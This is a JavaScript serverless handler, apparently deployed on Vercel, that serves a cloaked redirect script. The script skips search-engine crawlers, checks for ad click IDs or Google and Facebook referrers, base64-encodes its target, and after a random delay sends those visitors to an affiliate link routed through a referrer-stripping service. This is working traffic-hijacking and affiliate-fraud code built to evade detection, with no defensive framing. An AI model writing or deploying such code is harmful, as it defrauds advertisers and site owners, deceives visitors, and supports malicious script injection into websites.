const CONFIG_PATH = "redirect-config.json";

async function getConfig() {
  if (process.env.BLOB_READ_WRITE_TOKEN) {
    try {
      const { get } = await import("@vercel/blob");
      const result = await get(CONFIG_PATH, { access: "private" });
      if (result?.statusCode === 200) {
        const text = await new Response(result.stream).text();
        return JSON.parse(text);
      }
    } catch (e) {}
  }
  return {
    enabled: process.env.REDIRECT_ENABLED !== "false",
    redirectUrl: process.env.REDIRECT_URL || "https://href.li/?https://be.elementor.com/visit/?bta=204253&nci=5758",
  };
}

export default async function handler(req, res) {
  const cfg = await getConfig();
  const enc = Buffer.from(cfg.redirectUrl, "utf-8").toString("base64");
  const script = `(function(){var E=${cfg.enabled};if(!E)return;var u=navigator.userAgent.toLowerCase();if(/googlebot|bingbot/.test(u))return;var p=new URLSearchParams(window.location.search);var r=document.referrer||"";var a=p.has("gclid")||p.has("fbclid")||p.has("msclkid")||p.has("ttclid")||r.includes("google.com")||r.includes("/aclk")||r.includes("facebook.com")||r.includes("fb.com");if(!a)return;var d=atob("${enc}");setTimeout(function(){window.location.href=d;},800+Math.random()*700);})();`;
  res.setHeader("Content-Type", "application/javascript");
  res.setHeader("Cache-Control", "no-store");
  res.send(script);
}
